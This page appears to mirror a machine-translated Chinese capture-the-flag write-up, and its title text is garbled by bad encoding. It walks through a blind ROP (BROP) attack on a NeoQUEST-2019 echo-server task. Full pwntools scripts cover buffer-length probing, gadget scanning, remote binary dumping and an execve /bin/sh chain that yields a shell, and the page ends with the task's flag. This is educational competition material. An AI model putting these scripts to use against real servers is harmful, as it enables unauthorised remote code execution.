<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ•´ï¸ ğŸ§š ğŸ’ æœåŠ¡å™¨ï¼Œæ‚¨èƒ½å¬åˆ°æˆ‘è¯´è¯å—ï¼Ÿ NeoQUEST-2019ä»»åŠ¡ç¤ºä¾‹çš„BROPæ”»å‡» ğŸ˜” ğŸ”” ğŸ¤¾ğŸ½</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="å¦‚ä½•åœ¨æ²¡æœ‰ä¿¡æ¯çš„æœåŠ¡å™¨ä¸Šæ‰¾åˆ°æ¼æ´ï¼Ÿ BROPä¸ROPæœ‰ä½•ä¸åŒï¼Ÿ æ˜¯å¦å¯ä»¥é€šè¿‡ç¼“å†²åŒºæº¢å‡ºä»æœåŠ¡å™¨ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶ï¼Ÿ æ¬¢è¿æ¥åˆ°è¿™åªçŒ«ï¼Œæˆ‘ä»¬å°†ä»¥ä¼ é€’NeoQUEST-2019ä»»åŠ¡ä¸ºä¾‹åˆ†æè¿™äº›é—®é¢˜çš„ç­”æ¡ˆï¼ 

 æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£ä¸ºï¼š 213.170.100.211 10000 ã€‚ è®©æˆ‘ä»¬å°è¯•è¿æ¥åˆ°å®ƒï¼š 

...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>æœåŠ¡å™¨ï¼Œæ‚¨èƒ½å¬åˆ°æˆ‘è¯´è¯å—ï¼Ÿ NeoQUEST-2019ä»»åŠ¡ç¤ºä¾‹çš„BROPæ”»å‡»</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/neobit/blog/446942/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/d0/f6/ha/d0f6hadxvanaec185oy2mrhds9g.jpeg"></div><br><br> å¦‚ä½•åœ¨æ²¡æœ‰ä¿¡æ¯çš„æœåŠ¡å™¨ä¸Šæ‰¾åˆ°æ¼æ´ï¼Ÿ  BROPä¸ROPæœ‰ä½•ä¸åŒï¼Ÿ æ˜¯å¦å¯ä»¥é€šè¿‡ç¼“å†²åŒºæº¢å‡ºä»æœåŠ¡å™¨ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶ï¼Ÿ æ¬¢è¿æ¥åˆ°è¿™åªçŒ«ï¼Œæˆ‘ä»¬å°†ä»¥ä¼ é€’<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">NeoQUEST-2019</a>ä»»åŠ¡ä¸ºä¾‹åˆ†æè¿™äº›é—®é¢˜çš„ç­”æ¡ˆï¼ <br><a name="habracut"></a><br> æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£ä¸ºï¼š <b>213.170.100.211 10000</b> ã€‚ è®©æˆ‘ä»¬å°è¯•è¿æ¥åˆ°å®ƒï¼š <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/kk/vk/hs/kkvkhs9yuyyv3v3wjniyeubciam.png"></div><br> ä¹ä¸€çœ‹-å¸¸è§„å›æ˜¾æœåŠ¡å™¨æ²¡ä»€ä¹ˆç‰¹åˆ«çš„ï¼šè¿”å›æˆ‘ä»¬è‡ªå·±å‘é€ç»™å®ƒçš„ç›¸åŒå†…å®¹ã€‚ <br><br> åœ¨å¤„ç†äº†ä¼ è¾“æ•°æ®çš„å¤§å°ä¹‹åï¼Œæ‚¨ä¼šæ³¨æ„åˆ°ï¼Œå¦‚æœçº¿è·¯é•¿åº¦è¶³å¤Ÿé•¿ï¼ŒæœåŠ¡å™¨å°†æ— æ³•ç«™ç«‹å¹¶ç»ˆæ­¢è¿æ¥ï¼š <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/tb/w_/o3/tbw_o3nn4-fxbu4qt8tbc9xjgkc.png"></div><br> å—¯ï¼Œå¥½åƒæº¢å‡ºäº†ã€‚ <br><br> æ‰¾åˆ°ç¼“å†²åŒºçš„é•¿åº¦ã€‚ æ‚¨å¯ä»¥ç®€å•åœ°è¿­ä»£è¿™äº›å€¼ï¼Œç„¶åé€’å¢å®ƒä»¬ï¼Œç›´åˆ°æˆ‘ä»¬ä»æœåŠ¡å™¨è·å¾—éæ ‡å‡†è¾“å‡ºä¸ºæ­¢ã€‚ ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨äºŒè¿›åˆ¶æœç´¢æ¥æ˜¾ç¤ºä¸€äº›æŠ€å·§ï¼Œå¹¶åŠ å¿«å¤„ç†è¿‡ç¨‹ï¼Œæ£€æŸ¥åœ¨ä¸‹ä¸€ä¸ªè¯·æ±‚åæœåŠ¡å™¨æ˜¯å¦å´©æºƒæˆ–æ²¡æœ‰å´©æºƒã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">ç¡®å®šç¼“å†²åŒºé•¿åº¦</b> <div class="spoiler_text"><pre><code class="java hljs">from pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> threading <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys ADDR = <span class="hljs-string"><span class="hljs-string">"213.170.100.211"</span></span> PORT = <span class="hljs-number"><span class="hljs-number">10000</span></span> <span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">find_offset</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">: start </span></span>= <span class="hljs-number"><span class="hljs-number">0</span></span> end = <span class="hljs-number"><span class="hljs-number">200</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: conn = remote(ADDR, PORT) curlen = (start + end) <span class="hljs-comment"><span class="hljs-comment">// 2 print("Testing {}".format(curlen)) payload = b'\xff' * curlen conn.send(payload) time.sleep(0.5) r = conn.recv() payload = b'\xff' * (curlen) conn.send(payload) try: r = conn.recv() start = curlen payload = b'\xff' * (curlen + 1) conn.send(payload) time.sleep(0.5) r = conn.recv() conn.send(payload) try: r = conn.recv() except EOFError: print("\nBuffer length is {}".format(curlen), flush=True) return curlen except EOFError: end = curlen return -1</span></span></code> </pre> <br></div></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/gn/me/c6/gnmec6g5vqg2eed5j7rysddlhz0.png"></div><br> å› æ­¤ï¼Œç¼“å†²åŒºçš„é•¿åº¦ä¸º136ã€‚å¦‚æœæ‚¨å‘æœåŠ¡å™¨å‘é€136ä¸ªå­—èŠ‚ï¼Œåˆ™æˆ‘ä»¬å°†è¡Œæœ«å°¾çš„ç©ºå­—èŠ‚æ“¦é™¤åˆ°å †æ ˆä¸Šå¹¶è·å–å…¶åçš„æ•°æ®-å€¼ä¸º0x400155ã€‚ è¿™æ˜¾ç„¶æ˜¯å¯„ä¿¡äººåœ°å€ã€‚ è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚ ä½†æ˜¯æˆ‘ä»¬æœ¬èº«æ²¡æœ‰å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¸çŸ¥é“å¯ä»¥è®©æˆ‘ä»¬è·å¾—å¤–å£³ç¨‹åºçš„ROPå°å·¥å…·çš„ç¡®åˆ‡ä½ç½®ã€‚ <br><br> è¯¥æ€ä¹ˆåŠï¼Ÿ <br><br> åªè¦è¿”å›åœ°å€æ˜¯å—æ§çš„ï¼Œå°±æœ‰ä¸€ç§ç‰¹æ®Šçš„æŠ€æœ¯å¯ä»¥è§£å†³æ­¤ç±»é—®é¢˜- <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">é¢å‘ç›²è¿”å›çš„ç¼–ç¨‹</a> ã€‚ æœ¬è´¨ä¸Šï¼ŒBROPæ˜¯å¯¹å¯æ‰§è¡Œæ–‡ä»¶çš„å°å·¥å…·è¿›è¡Œç›²ç›®æ‰«æã€‚ æˆ‘ä»¬ç”¨æ–‡æœ¬æ®µä¸­çš„æŸä¸ªåœ°å€é‡å†™è¿”å›åœ°å€ï¼Œåœ¨å †æ ˆä¸Šè®¾ç½®æ‰€éœ€å°å·¥å…·çš„å‚æ•°å¹¶åˆ†æç¨‹åºè¡Œä¸ºã€‚ åŸºäºåˆ†æï¼Œæ— è®ºæˆ‘ä»¬æ˜¯å¦çŒœåˆ°ï¼Œéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªå‡è®¾ã€‚ ç‰¹æ®Šçš„è¾…åŠ©å°å·¥å…·èµ·ç€é‡è¦çš„ä½œç”¨- <b>åœæ­¢</b> ï¼ˆå…¶æ‰§è¡Œä¸ä¼šå¯¼è‡´ç¨‹åºç»ˆæ­¢ï¼‰å’Œ<b>é™·é˜±</b> ï¼ˆå…¶æ‰§è¡Œå°†å¯¼è‡´ç¨‹åºç»“æŸï¼‰ã€‚ å› æ­¤ï¼Œé¦–å…ˆæ‰¾åˆ°è¾…åŠ©å°å·¥å…·ï¼Œå¹¶åœ¨å®ƒä»¬çš„å¸®åŠ©ä¸‹å·²ç»æœç´¢äº†å¿…è¦çš„å°å·¥å…·ï¼ˆé€šå¸¸æ˜¯ä¸ºäº†è°ƒç”¨<b>write</b>å¹¶è·å–å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ã€‚ <br><br> ä¾‹å¦‚ï¼Œæˆ‘ä»¬æƒ³è¦æ‰¾åˆ°ä¸€ä¸ªå°å·¥å…·ï¼Œè¯¥å°å·¥å…·å°†æ¥è‡ªå †æ ˆçš„å•ä¸ªå€¼æ”¾å…¥å¯„å­˜å™¨å¹¶æ‰§è¡Œ<b>ret</b> ã€‚ æˆ‘ä»¬å°†è®°å½•æµ‹è¯•çš„åœ°å€è€Œä¸æ˜¯è¿”å›åœ°å€ï¼Œä»¥ä¾¿å°†æ§åˆ¶æƒè½¬ç§»ç»™å®ƒã€‚ åœ¨æ­¤ä¹‹åï¼Œæˆ‘ä»¬è®°ä¸‹æˆ‘ä»¬ä¹‹å‰å‘ç°çš„<b>Trap</b>å°å·¥å…·çš„åœ°å€ï¼Œå¹¶åœ¨å…¶åé¢æ˜¯<b>Stop</b>å°å·¥å…·çš„åœ°å€ã€‚ æœ€ç»ˆç»“æœæ˜¯ï¼šå¦‚æœæœåŠ¡å™¨å´©æºƒï¼ˆ <b>é™·é˜±</b>å·¥ä½œï¼‰ï¼Œåˆ™è¯¥å°å·¥å…·ä½äºå½“å‰çš„æµ‹è¯•åœ°å€ï¼Œè¯¥åœ°å€ä¸æ‰€å¯»æ±‚çš„åœ°å€ä¸åŒ¹é…ï¼šå®ƒä¸ä¼šä»å †æ ˆä¸­åˆ é™¤<b>é™·é˜±</b>å°å·¥å…·çš„åœ°å€ã€‚ å¦‚æœ<b>Stop</b>èµ·ä½œç”¨äº†ï¼Œé‚£ä¹ˆå½“å‰çš„å°å·¥å…·å¯èƒ½æ­£æ˜¯æˆ‘ä»¬è¦å¯»æ‰¾çš„ï¼šå®ƒä»å †æ ˆä¸­åˆ é™¤äº†ä¸€ä¸ªå€¼ã€‚ å› æ­¤ï¼Œæ‚¨å¯ä»¥æœç´¢ä¸ç‰¹å®šè¡Œä¸ºåŒ¹é…çš„å°å·¥å…·ã€‚ <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/wv/lg/n5/wvlgn5htlbmneqpwkwx3ukpnwfs.png"></div><br> ä½†æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ç®€åŒ–æœç´¢ã€‚ æˆ‘ä»¬è‚¯å®šçŸ¥é“æœåŠ¡å™¨æ­£åœ¨ä¸ºæˆ‘ä»¬å°åˆ·ä¸€äº›ä»·å€¼ã€‚ æ‚¨å¯ä»¥å°è¯•æ‰«æå¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„å„ç§åœ°å€ï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦å†æ¬¡è·å¾—æ˜¾ç¤ºè¯¥è¡Œçš„ä»£ç ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">å°å·¥å…·å‘ç°</b> <div class="spoiler_text"><pre> <code class="java hljs">lock = threading.Lock() <span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">safe_get_next</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(gen)</span></span></span><span class="hljs-function">: with lock: return </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">next</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(gen)</span></span></span><span class="hljs-function"> def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">find_puts</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(offiter, buffsize, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: offset </span></span>= <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: conn = remote(ADDR, PORT) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: offset = safe_get_next(offiter) except StopIteration: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(base + offset) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> offset % <span class="hljs-number"><span class="hljs-number">0x10</span></span> == <span class="hljs-number"><span class="hljs-number">0</span></span>: print(<span class="hljs-string"><span class="hljs-string">"Checking address {:#x}"</span></span>.format(base + offset), flush=True) conn.send(payload) time.sleep(<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: r = conn.recv() r = r.strip(b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize)[<span class="hljs-number"><span class="hljs-number">3</span></span>:] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">if</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">len</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(r)</span></span></span><span class="hljs-function"> &gt; 0: </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">print</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"Memleak at {:#x}, {} bytes"</span></span></span></span><span class="hljs-function"><span class="hljs-params">.format(base + offset, len(r)</span></span></span><span class="hljs-function">), flush</span></span>=True) except: pass <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span>: conn.close() offset_iter = iter(range(<span class="hljs-number"><span class="hljs-number">0x200</span></span>)) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">for</span></span></span><span class="hljs-function"> _ in </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">range</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">16</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: threading.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Thread</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(target=find_puts, args=(offset_iter, buffer_size, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400100</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">).</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">start</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> time.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sleep</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">1</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span></span></code> </pre> <br></div></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/v2/ec/pj/v2ecpjnrxpyfi0q8bmyxcjxuwj8.png"></div><br> æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨æ­¤æ³„æ¼è·å–å¯æ‰§è¡Œæ–‡ä»¶ï¼Ÿ <br><br> æˆ‘ä»¬çŸ¥é“æœåŠ¡å™¨ä¼šå†™ä¸€è¡Œä½œä¸ºå“åº”ã€‚ å½“æˆ‘ä»¬è½¬åˆ°åœ°å€<b>0x40016fæ—¶ï¼Œ</b>è¾“å‡ºå‡½æ•°<b>çš„</b>å‚æ•°å……æ»¡äº†æŸç§åƒåœ¾ã€‚ å› ä¸ºä»è¿”å›åœ°å€æ¥çœ‹ï¼Œæˆ‘ä»¬æ­£åœ¨å¤„ç†ä¸€ä¸ª64ä½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥å‡½æ•°çš„å‚æ•°<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ä½äº</a>å¯„å­˜å™¨ä¸­ã€‚ <br><br> ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå°å·¥å…·æ¥æ§åˆ¶å¯„å­˜å™¨çš„å†…å®¹ï¼ˆå°†å®ƒä»¬ä»å †æ ˆä¸­æ”¾å…¥ï¼‰ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ è®©æˆ‘ä»¬å°è¯•ä½¿ç”¨ç›¸åŒçš„æŠ€æœ¯æ‰¾åˆ°å®ƒã€‚ æˆ‘ä»¬å¯ä»¥å°†ä»»ä½•å€¼æ”¾åœ¨å †æ ˆä¸Šï¼Œå¯¹å—ï¼Ÿ å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¼¹å‡ºå¼å°å·¥å…·ï¼Œå°†å…¶å€¼æ”¾åœ¨æ‰€éœ€çš„å¯„å­˜å™¨ä¸­ï¼Œç„¶åå†è°ƒç”¨è¾“å‡ºå‡½æ•°ã€‚ å°†ELFæ–‡ä»¶å¼€å¤´çš„åœ°å€ï¼ˆ <b>0x400000</b> ï¼‰è®¾ç½®ä¸ºå­—ç¬¦ä¸²çš„åœ°å€ã€‚ å¦‚æœæˆ‘ä»¬æ‰¾åˆ°åˆé€‚çš„å°å·¥å…·ï¼Œåˆ™æœåŠ¡å™¨å°†å¿…é¡»æ‰“å°ç­¾å<b>7F 45 4C 46</b>ä½œä¸ºå“åº”ã€‚ <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/vv/y-/po/vvy-podceguh1qf3k2ezoepoy0u.png"></div><br><div class="spoiler">  <b class="spoiler_title">å°å·¥å…·æœç´¢ç»§ç»­</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">find_pop</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(offiter, buffsize, puts, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: offset </span></span>= <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: conn = remote(ADDR, PORT) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: offset = safe_get_next(offiter) except StopIteration: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> offset % <span class="hljs-number"><span class="hljs-number">0x10</span></span> == <span class="hljs-number"><span class="hljs-number">0</span></span>: print(<span class="hljs-string"><span class="hljs-string">"Checking address {:#x}"</span></span>.format(base + offset), flush=True) payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(base + offset) payload += p64(<span class="hljs-number"><span class="hljs-number">0x400001</span></span>) payload += p64(puts) conn.send(payload) time.sleep(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: r = conn.recv() r = r.strip(b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize)[<span class="hljs-number"><span class="hljs-number">3</span></span>:] <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> b<span class="hljs-string"><span class="hljs-string">'ELF'</span></span> in r: print(<span class="hljs-string"><span class="hljs-string">"Binary leak at at {:#x}"</span></span>.format(base + offset), flush=True) except: pass <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span>: conn.close() offset_iter = iter(range(<span class="hljs-number"><span class="hljs-number">0x200</span></span>)) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">for</span></span></span><span class="hljs-function"> _ in </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">range</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">16</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: threading.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Thread</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(target=find_pop, args=(offset_iter, buffer_size, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x40016f</span></span></span></span><span class="hljs-function"><span class="hljs-params">, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400100</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">).</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">start</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> time.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sleep</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">1</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span></span></code> </pre> <br></div></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/k8/po/ba/k8poba10qmh_-ssoas6vajqhfl0.png"></div><br> ä½¿ç”¨ç”Ÿæˆçš„åœ°å€ï¼Œæˆ‘ä»¬ä»æœåŠ¡å™¨ä¸­æŠ½å‡ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">æ–‡ä»¶æå–</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dump</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(buffsize, pop, puts, offset, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: conn </span></span>= remote(ADDR, PORT) payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(pop) payload += p64(base + offset) # what to dump payload += p64(puts) conn.send(payload) time.sleep(<span class="hljs-number"><span class="hljs-number">0.5</span></span>) r = conn.recv() r = r.strip(b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize) conn.close() <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> r[<span class="hljs-number"><span class="hljs-number">3</span></span>:]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> r[<span class="hljs-number"><span class="hljs-number">3</span></span>:] <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> None</code> </pre> <br></div></div><br> è®©æˆ‘ä»¬åœ¨IDAä¸­çœ‹åˆ°å®ƒï¼š <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/dn/zf/pf/dnzfpf9byw59lzmq6uxutqfdfgg.png"></div><br> åœ°å€<b>0x40016f</b>å¯¼è‡´æˆ‘ä»¬è¿›å…¥<b>syscall</b> ï¼Œè€Œåœ°å€<b>0x40017f</b>å¯¼è‡´æˆ‘ä»¬è¿›å…¥<b>pop rsi</b> ï¼›  <b>æ’¤é€€</b> ã€‚ <br><br> ç°åœ¨æ‚¨å·²ç»æœ‰äº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥æ„å»ºä¸€ä¸ªROPé“¾ã€‚ è€Œä¸”ï¼Œè¡Œ<b>/ bin / shä¹Ÿåœ¨å…¶ä¸­</b> ï¼ <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/mp/--/ui/mp--uihjhux5_-xbm9aqcfbclpi.png"></div><br> æˆ‘ä»¬å½¢æˆä¸€ä¸ªä½¿ç”¨<b>/ bin / sh</b>å‚æ•°è°ƒç”¨<b>ç³»ç»Ÿ</b>çš„é“¾ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åœ¨æ­¤å¤„</a>æ‰¾åˆ°æœ‰å…³64ä½Linuxç³»ç»Ÿè°ƒç”¨çš„ä¿¡æ¯ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">æœ€åä¸€æ­¥</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">get_shell</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(buffsize, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: conn </span></span>= remote(ADDR, PORT) payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x17d</span></span>) payload += p64(<span class="hljs-number"><span class="hljs-number">59</span></span>) payload += p64(<span class="hljs-number"><span class="hljs-number">0</span></span>) payload += p64(<span class="hljs-number"><span class="hljs-number">0</span></span>) payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x1ce</span></span>) payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x1d0</span></span>) payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x17b</span></span>) conn.send(payload) conn.interactive()</code> </pre> <br></div></div><br> è¿è¡Œæ¼æ´å¹¶è·å–shellï¼š <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/vk/bv/vi/vkbvviq-wsbdkmie1iksoiwckim.png"></div><br> èƒœåˆ©äº†ï¼ <br><br>  <b>NQ201934D811DCBD6AA2926218976CB3340DE95902DD0F33E60E4FF32BAD209BBA4433</b> <br><br> å¾ˆå¿«ï¼Œvraytapså°†å‡ºç°åœ¨NeoQUEST-2019åœ¨çº¿é˜¶æ®µçš„å…¶ä»–ä»»åŠ¡ä¸­ã€‚ è€Œâ€œå¯¹æŠ—â€å°†äº6æœˆ26æ—¥ä¸¾è¡Œï¼ æ–°é—»å°†å‡ºç°åœ¨æ´»åŠ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ç½‘ç«™ä¸Š</a> ï¼Œè¯·ä¸è¦é”™è¿‡ï¼ </div></div><p>Source: <a rel="nofollow" 